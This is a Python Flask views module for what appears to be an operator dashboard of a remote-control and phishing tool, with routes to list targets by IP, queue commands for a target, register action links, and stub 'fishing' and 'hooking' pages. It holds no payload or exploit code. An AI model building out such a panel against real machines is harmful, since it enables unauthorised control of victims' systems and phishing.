from flask import Flask,render_template,url_for,Blueprint,request,session,flash,redirect,jsonify
from sqlalchemy.orm import sessionmaker

from db.modle import Users,APICommand,APILink,Fishing,Hooking,Targets
from db.mange_db import config,_create_engine
from utility.email_temp import email_temp
from utility.processer import log,getlist,readFromJson

emailTemplate = email_temp()

Session = sessionmaker(bind=_create_engine())
_session = Session()

view = Blueprint("view",__name__,template_folder = "templates")

@view.route("/dashboard")
# home page with login and singin buttons and some additional info
def profile():
    if "email" in session:
        email = session['email']
        print(email)
        targets = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(),sp=',')
        _targets = []
        for target in targets:
            target_ = readFromJson()['target-info'][target[0]]
            if '127.0.0.1' in target_['ip']:
                conn = 'local'
            elif '192.168' in target_['ip']:
                conn = 'wifi'
            else:
                # , mdi mdi-ethernet-cable
                conn = 'ethernet'
            _targets.append((target_,conn,target[0]))

        if request.method != 'GET':
            return redirect(url_for('event.page_404'))
        return render_template('profile.html',targets=_targets)
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))

@view.route("/api_command/<targetName>",methods=['GET','POST'])
def api_command(targetName=None):
    if "email" in session:
        if targetName is not None:
            try:
                if request.method == 'GET':

                    targets = getlist(_session.query(Targets).filter_by(target_name=targetName).all(),sp=',')
                    if len(targets) != 0:
                        
                        return render_template('api_command.html')
                    else:
                        flash(f'No such a target {targetName}')
                        return redirect(request.referrer)
            
                elif request.method == 'POST':

                    CMD = request.json.get('input')
                    add_cmd = APICommand(config.ID(n=7),session['email'],CMD,config.CMD_CONDION[False])
                    _session.add(add_cmd)
                    _session.commit()

                    return {'message':'command saved successfully'},200
            
            except Exception as e:
                print(e)
                _session.rollback()
                log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
                return redirect(url_for('event.page_500'))
            finally:
                _session.close()
        else:
            flash('pleas provid target name')
            return redirect(url_for("view.profile")) 

    else:
        flash("you must login first")
        return redirect(url_for("public.login"))

@view.route('/api_command/api/<targetName>')
def api_command_(targetName):
    if "email" in session:
        try:
            apiCommand = getlist(_session.query(APICommand).filter_by(email=session['email'],target_name=targetName).all(),sp=',')
            return {'allCommand': apiCommand},200
        
        except Exception as e:

            log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
            _session.rollback()
            return {'error': 'Server side Error'},500
        
        finally:
            _session.close()
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/socket/<target_name>")
def socket(target_name):
    if "email" in session:
        return render_template('socket.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/api_link", methods=["GET", "POST"])
def api_link():
    if "email" not in session:
        flash("You must login first")
        return redirect(url_for("public.login"))

    if request.method == "POST":
        try:
            new_link = APILink(
                ID=config.ID(),
                email=session["email"],
                target_name=request.form.get("target_name"),
                link=request.form.get("link"),
                action_type=request.form.get("action_type"),
                condition=int(request.form.get("condition", 0))
            )
            _session.add(new_link)
            _session.commit()
            return redirect(url_for("view.api_link"))
        
        except Exception as e:
            print(e)
            _session.rollback()
            log(f'[ERROR ROUT] : {request.endpoint} error: {e}')
            return redirect(url_for('event.page_500'))
        finally:
            _session.close()

    links = _session.query(APILink).filter_by(email=session["email"]).all()
    targetInfo = getlist(_session.query(Targets).filter_by(user_email=session['email']).all(),sp=',')
    targets = [target[0] for target in targetInfo]
    print(targets)
    return render_template("api_link.html", links=links, targets=targets)

@view.route("/fishing")
def fishing():
    if "email" in session:
        return render_template('api_link.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/hooking")
def hooking():
    if "email" in session:
        return render_template('api_link.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/code")
def code():
    if "email" in session:
        return render_template('code.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))


@view.route("/settings",methods=['POST','GET'])
def setting():
    if "email" in session:
        return render_template('setting.html')
    else:
        flash("you must login first")
        return redirect(url_for("public.login"))
